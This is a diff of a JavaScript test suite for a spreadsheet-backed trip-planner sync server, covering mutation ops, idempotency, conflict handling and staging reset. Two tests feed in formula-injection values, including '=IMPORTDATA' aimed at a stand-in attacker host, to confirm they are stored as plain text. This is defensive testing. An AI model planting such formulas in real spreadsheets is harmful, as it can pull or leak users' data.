@@ -6,6 +6,7 @@ suite('server', function () {
     var out = {};
     Object.keys(raw).forEach(function (k) { out[k] = { values: raw[k].values }; });
     out.Hotels.displayOverride = { 1: { 12: '11112222333344445' } };
+    out._SyncLog = { values: [['opId', 'Received at', 'Device', 'Type', 'Entity ID', 'Result', 'Reason']] };
     if (mutate) mutate(out);
     return out;
   }
@@ -43,7 +44,7 @@ suite('server', function () {
   test('snapshot: response shape (HANDOFF §6)', function () {
     STUB.reset(tabs());
     var r = snap();
-    eq(r.ok, true); eq(r.api, 1); eq(r.serverVersion, '0.1.0'); eq(r.env, 'staging');
+    eq(r.ok, true); eq(r.api, 1); eq(r.serverVersion, '0.2.0'); eq(r.env, 'staging');
     ok(/^[0-9a-f]{16}$/.test(r.rev), 'rev hex');
     ok(!isNaN(Date.parse(r.generatedAt)));
     deepEq(Object.keys(r.data).sort(), ['checklists', 'expenses', 'hotels', 'ideas', 'itinerary', 'phrases', 'settings', 'transportation']);
@@ -174,11 +175,226 @@ suite('server', function () {
     ok(r.issues.some(function (i) { return i.id === 'V-09' && i.tab === 'Ideas'; }));
   });
 
-  test('resetStaging: refused in prod, not yet available in staging', function () {
+  // ---------- mutate (HANDOFF §6) ----------
+  var T0 = '2026-10-20T10:00:00.000Z';
+  function at(min) { return new Date(Date.parse(T0) + min * 60000).toISOString(); }
+  var seq = 0;
+  function op(type, id, fields, when, opId) {
+    return { opId: opId || 'op_test' + (++seq) + 'abcdef', type: type, id: id, fields: fields || {}, clientUpdatedAt: when || at(0) };
+  }
+  function mutate(ops) { return STUB.post({ token: STUB.token(), action: 'mutate', device: 'lindsay-iphone', appVersion: '0.2.0', ops: ops }); }
+  function rowOf(tab, id) { return STUB.sheets[tab].rows.filter(function (r) { return r[0] === id; })[0]; }
+  function cell(tab, id, header) { return rowOf(tab, id)[STUB.sheets[tab].rows[0].indexOf(header)]; }
+  function logRows() { return STUB.sheets._SyncLog.rows.slice(1); }
+
+  test('mutate: checklist.update ticks the row, fills Done by / Done at / Updated at, and logs it', function () {
+    STUB.reset(tabs());
+    var r = mutate([op('checklist.update', 'ck_1', { done: true, doneBy: 'Lindsay' }, at(1))]);
+    eq(r.ok, true); eq(r.api, 1); eq(r.serverVersion, '0.2.0');
+    eq(r.results.length, 1);
+    eq(r.results[0].status, 'applied');
+    eq(r.results[0].serverUpdatedAt, at(1));
+    eq(cell('Checklists', 'ck_1', 'Done'), true);
+    eq(cell('Checklists', 'ck_1', 'Done by'), 'Lindsay');
+    eq(cell('Checklists', 'ck_1', 'Done at'), at(1));
+    eq(cell('Checklists', 'ck_1', 'Updated at'), at(1));
+    eq(logRows().length, 1);
+    deepEq([logRows()[0][2], logRows()[0][3], logRows()[0][4], logRows()[0][5]], ['lindsay-iphone', 'checklist.update', 'ck_1', 'applied']);
+    eq(STUB.writes.filter(function (w) { return !w.locked; }).length, 0, 'every write under the lock');
+    eq(STUB.lockHeld, false);
+    var item = snap().data.checklists.filter(function (c) { return c.id === 'ck_1'; })[0];
+    eq(item.done, true, 'the next snapshot shows it');
+    eq(item.doneBy, 'Lindsay');
+  });
+
+  test('idempotency: replaying an applied opId returns duplicate and writes nothing to the tab', function () {
+    STUB.reset(tabs());
+    var o = op('checklist.update', 'ck_1', { done: true }, at(1));
+    mutate([o]);
+    var before = JSON.stringify(STUB.sheets.Checklists.rows);
+    var r = mutate([o]);
+    eq(r.results[0].status, 'duplicate');
+    eq(JSON.stringify(STUB.sheets.Checklists.rows), before);
+    deepEq(logRows().map(function (l) { return l[5]; }), ['applied', 'duplicate']);
+    eq(mutate([o, o]).results.map(function (x) { return x.status; }).join(), 'duplicate,duplicate', 'also within one batch');
+  });
+
+  test('last write wins by clientUpdatedAt: an older op is stale and changes nothing (AC-L2)', function () {
+    STUB.reset(tabs());
+    mutate([op('checklist.update', 'ck_1', { done: true }, at(5))]);
+    var r = mutate([op('checklist.update', 'ck_1', { done: false }, at(3))]);
+    eq(r.results[0].status, 'stale');
+    eq(r.results[0].serverUpdatedAt, at(5));
+    eq(cell('Checklists', 'ck_1', 'Done'), true, 'the newer toggle stays');
+    eq(mutate([op('checklist.update', 'ck_1', { done: false }, at(5))]).results[0].status, 'stale', 'a tie keeps the stored edit');
+    eq(mutate([op('checklist.update', 'ck_1', { done: false }, at(6))]).results[0].status, 'applied');
+    eq(cell('Checklists', 'ck_1', 'Done'), false);
+    eq(cell('Checklists', 'ck_1', 'Done at'), '', 'unticking clears Done at');
+    eq(cell('Checklists', 'ck_1', 'Done by'), '');
+  });
+
+  test('checklist.add writes after the last real row (reusing the FALSE-checkbox row); a new op for the same ID updates it', function () {
+    STUB.reset(tabs());
+    var r = mutate([op('checklist.add', 'ck_new1', { list: 'Packing', item: 'Umbrella', owner: 'Both', bag: 'Suitcase', sort: 500 }, at(1))]);
+    eq(r.results[0].status, 'applied');
+    var rows = STUB.sheets.Checklists.rows;
+    eq(rows[2][0], 'ck_new1', 'written on row 3, the first empty row');
+    eq(cell('Checklists', 'ck_new1', 'Done'), false);
+    eq(cell('Checklists', 'ck_new1', 'Deleted'), false);
+    eq(cell('Checklists', 'ck_new1', 'Sort'), 500);
+    mutate([op('checklist.add', 'ck_new2', { list: 'Packing', item: 'Hat' }, at(2))]);
+    eq(rows[3][0], 'ck_new2', 'the next add goes below it');
+    eq(mutate([op('checklist.add', 'ck_new1', { list: 'Packing', item: 'Big umbrella' }, at(3))]).results[0].status, 'applied');
+    eq(cell('Checklists', 'ck_new1', 'Item'), 'Big umbrella');
+    eq(rows.filter(function (x) { return x[0] === 'ck_new1'; }).length, 1, 'no duplicate row');
+    ok(STUB.raw.some(function (w) { return w.tab === 'Checklists' && w.value === "'Umbrella"; }), 'item text sent with the text prefix');
+    ok(STUB.raw.some(function (w) { return w.tab === 'Checklists' && w.value === 500; }), 'numbers stay numbers');
+  });
+
+  test('rows are found by ID even after someone sorts the tab', function () {
+    STUB.reset(tabs(function (t) {
+      t.Checklists.values.splice(1, 0, ['ck_2', 'Pre-trip', 'Other task', 'Jordan', '—', '', false, '', '', '', '', '', false]);
+    }));
+    var rows = STUB.sheets.Checklists.rows;
+    var header = rows.shift(); rows.reverse(); rows.unshift(header);
+    mutate([op('checklist.update', 'ck_1', { notes: 'moved' }, at(1))]);
+    eq(cell('Checklists', 'ck_1', 'Notes'), 'moved');
+    eq(cell('Checklists', 'ck_2', 'Notes'), '');
+  });
+
+  test('checklist.delete is soft: the row stays and Deleted is ticked', function () {
+    STUB.reset(tabs());
+    var n = STUB.sheets.Checklists.rows.length;
+    eq(mutate([op('checklist.delete', 'ck_1', {}, at(1))]).results[0].status, 'applied');
+    eq(STUB.sheets.Checklists.rows.length, n);
+    eq(cell('Checklists', 'ck_1', 'Deleted'), true);
+  });
+
+  test('rejections: bad ops are refused one by one, with a reason, and write nothing to the tabs', function () {
+    STUB.reset(tabs());
+    var before = JSON.stringify(STUB.sheets.Checklists.rows);
+    var far = new Date(Date.now() + 3 * 24 * 3600000).toISOString();
+    var bad = [
+      op('checklist.explode', 'ck_1', {}),
+      op('checklist.update', 'ex_1', { done: true }),
+      op('checklist.update', 'ck_1', { deleted: true }),
+      op('checklist.update', 'ck_1', { owner: 'Bob' }),
+      op('checklist.update', 'ck_1', { due: 'Nov 1' }),
+      op('checklist.update', 'ck_1', { done: 'yes' }),
+      op('checklist.update', 'ck_1', { done: true }, far),
+      op('checklist.update', 'ck_nope', { done: true }),
+      op('checklist.add', 'ck_new3', { list: 'Packing' }),
+      { opId: 'bad id!', type: 'checklist.update', id: 'ck_1', fields: {}, clientUpdatedAt: at(1) },
+      op('checklist.update', 'ck_1', { done: true }, 'yesterday')
+    ];
+    var r = mutate(bad);
+    eq(r.ok, true);
+    r.results.forEach(function (x, i) { eq(x.status, 'rejected', 'op ' + i); ok(x.reason, 'op ' + i + ' has a reason'); });
+    ok(/clock/.test(r.results[6].reason));
+    ok(/Not found/.test(r.results[7].reason));
+    ok(/Missing item/.test(r.results[8].reason));
+    eq(JSON.stringify(STUB.sheets.Checklists.rows), before);
+  });
+
+  test('_SyncLog stores client strings as text; non-string type or id is rejected, not a crash', function () {
+    STUB.reset(tabs());
+    var r = mutate([op('checklist.update', '=HYPERLINK("x")', { done: true }, at(1)), { opId: 'op_abcdefgh', type: ['x'], id: { a: 1 }, fields: {}, clientUpdatedAt: at(1) }]);
+    eq(r.ok, true);
+    deepEq(r.results.map(function (x) { return x.status; }), ['rejected', 'rejected']);
+    eq(logRows()[0][4], '=HYPERLINK("x")');
+    ok(STUB.raw.some(function (w) { return w.tab === '_SyncLog' && w.value === "'=HYPERLINK(\"x\")"; }), 'sent with the text prefix');
+    ok(logRows().every(function (l) { return l.every(function (v) { return typeof v === 'string'; }); }), 'every log cell is text');
+  });
+
+  test('an edit can\'t blank a required column (Item, List)', function () {
+    STUB.reset(tabs());
+    var r = mutate([op('checklist.update', 'ck_1', { item: '' }, at(1)), op('checklist.update', 'ck_1', { list: '' }, at(2))]);
+    eq(r.results[0].status, 'rejected'); ok(/Can't clear item/.test(r.results[0].reason));
+    eq(r.results[1].status, 'rejected');
+    eq(cell('Checklists', 'ck_1', 'Item'), 'Fake task');
+  });
+
+  test('a rejected op retried with the same opId is evaluated again, not treated as a duplicate', function () {
+    STUB.reset(tabs(function (t) { t.Checklists.values[1][0] = 'ck_9'; }));
+    var o = op('checklist.update', 'ck_1', { done: true }, at(1));
+    eq(mutate([o]).results[0].status, 'rejected');
+    STUB.sheets.Checklists.rows[1][0] = 'ck_1';             // someone restores the row in the sheet
+    eq(mutate([o]).results[0].status, 'applied');
+  });
+
+  test('text that looks like a formula is stored as text, never run', function () {
+    STUB.reset(tabs());
+    mutate([op('checklist.update', 'ck_1', { notes: '=IMPORTDATA("https://evil.example")' }, at(1))]);
+    eq(cell('Checklists', 'ck_1', 'Notes'), '=IMPORTDATA("https://evil.example")');
+    var notesCol = STUB.sheets.Checklists.rows[0].indexOf('Notes') + 1;
+    var sent = STUB.raw.filter(function (w) { return w.tab === 'Checklists' && w.col === notesCol; });
+    eq(sent.length, 1);
+    eq(sent[0].value, "'=IMPORTDATA(\"https://evil.example\")", 'sent to the sheet with the text prefix');
+  });
+
+  test('expense.upsert adds a row with device and createdAt; a later upsert edits it; delete is soft', function () {
+    STUB.reset(tabs());
+    var f = { tripDate: '2026-11-21', amount: 1200, currency: 'JPY', envelope: 'Daily', category: 'Food', method: 'Cash', paidBy: 'Lindsay', note: 'ramen', taxFree: false };
+    eq(mutate([op('expense.upsert', 'ex_abc123', f, at(1))]).results[0].status, 'applied');
+    eq(cell('Expenses', 'ex_abc123', 'Amount'), 1200);
+    eq(cell('Expenses', 'ex_abc123', 'Device'), 'lindsay-iphone');
+    eq(cell('Expenses', 'ex_abc123', 'Created at'), at(1));
+    eq(mutate([op('expense.upsert', 'ex_abc123', { amount: 1300 }, at(2))]).results[0].status, 'applied');
+    eq(cell('Expenses', 'ex_abc123', 'Amount'), 1300);
+    eq(cell('Expenses', 'ex_abc123', 'Created at'), at(1), 'createdAt kept');
+    eq(mutate([op('expense.upsert', 'ex_def456', { amount: 1.5, tripDate: '2026-11-21', currency: 'JPY', envelope: 'Daily', category: 'Food' }, at(2))]).results[0].status, 'rejected', 'yen are whole numbers');
+    mutate([op('expense.delete', 'ex_abc123', {}, at(3))]);
+    eq(cell('Expenses', 'ex_abc123', 'Deleted'), true);
+    var e = snap().data.expenses.filter(function (x) { return x.id === 'ex_abc123'; })[0];
+    eq(e.amount, 1300); eq(e.deleted, true);
+  });
+
+  test('idea.add / idea.update and itinerary.setDone', function () {
+    STUB.reset(tabs());
+    eq(mutate([op('idea.add', 'id_abc123', { nameEn: 'Fake café', category: 'Café', city: 'Kyoto', status: 'Idea' }, at(1))]).results[0].status, 'applied');
+    eq(mutate([op('idea.update', 'id_abc123', { status: 'Planned', plannedDate: '2026-11-22' }, at(2))]).results[0].status, 'applied');
+    eq(cell('Ideas', 'id_abc123', 'Status'), 'Planned');
+    eq(mutate([op('itinerary.setDone', 'it_a1', { done: true }, at(1))]).results[0].status, 'applied');
+    eq(cell('Itinerary', 'it_a1', 'Done'), true);
+    eq(cell('Itinerary', 'it_a1', 'Updated'), at(1));
+    eq(mutate([op('itinerary.setDone', 'it_a1', { title: 'x' }, at(2))]).results[0].status, 'rejected', 'only Done can change');
+  });
+
+  test('mutate: bad batches and a busy lock', function () {
+    STUB.reset(tabs());
+    eq(STUB.post({ token: STUB.token(), action: 'mutate', ops: 'nope' }).code, 'BAD_REQUEST');
+    var many = []; for (var i = 0; i < 101; i++) many.push(op('checklist.update', 'ck_1', { done: true }, at(1)));
+    eq(mutate(many).code, 'BAD_REQUEST');
+    STUB.lockBusy = true;
+    STUB.writes = [];
+    eq(mutate([op('checklist.update', 'ck_1', { done: true }, at(1))]).code, 'LOCK_TIMEOUT');
+    eq(STUB.writes.length, 0);
+    eq(mutate([]).code, 'LOCK_TIMEOUT', 'still the lock, not a crash');
+    STUB.lockBusy = false;
+    eq(mutate([]).results.length, 0, 'an empty batch is fine');
+  });
+
+  test('a missing _SyncLog tab fails the whole call safely (INTERNAL), nothing written', function () {
+    STUB.reset(tabs(function (t) { delete t._SyncLog; }));
+    var before = JSON.stringify(STUB.sheets.Checklists.rows);
+    eq(mutate([op('checklist.update', 'ck_1', { done: true }, at(1))]).code, 'INTERNAL');
+    eq(JSON.stringify(STUB.sheets.Checklists.rows), before);
+    eq(STUB.lockHeld, false);
+  });
+
+  test('resetStaging: refused in prod; in staging clears only test rows (ID with a capital T) and their log lines', function () {
     STUB.reset(tabs(), { API_TOKEN: 'test-token-0123456789-0123456789-abc', ENV: 'prod' });
     eq(STUB.post({ token: STUB.token(), action: 'resetStaging' }).code, 'AUTH');
     STUB.reset(tabs());
-    eq(STUB.post({ token: STUB.token(), action: 'resetStaging' }).code, 'BAD_REQUEST');
+    mutate([op('checklist.add', 'ck_Tlive1', { list: 'Live test', item: 'one' }, at(1)),
+      op('checklist.update', 'ck_1', { done: true }, at(1)),
+      op('expense.upsert', 'ex_Tlive1', { tripDate: '2026-11-21', amount: 100, currency: 'JPY', envelope: 'Daily', category: 'Food' }, at(1))]);
+    var r = STUB.post({ token: STUB.token(), action: 'resetStaging' });
+    eq(r.ok, true);
+    eq(r.cleared, 4, '2 test rows + 2 log lines');
+    eq(rowOf('Checklists', 'ck_Tlive1'), undefined);
+    eq(cell('Checklists', 'ck_1', 'Done'), true, 'real rows untouched');
+    deepEq(logRows().filter(function (l) { return l[0]; }).map(function (l) { return l[4]; }), ['ck_1']);
   });
 
   test('unexpected failure → INTERNAL JSON, lock released', function () {
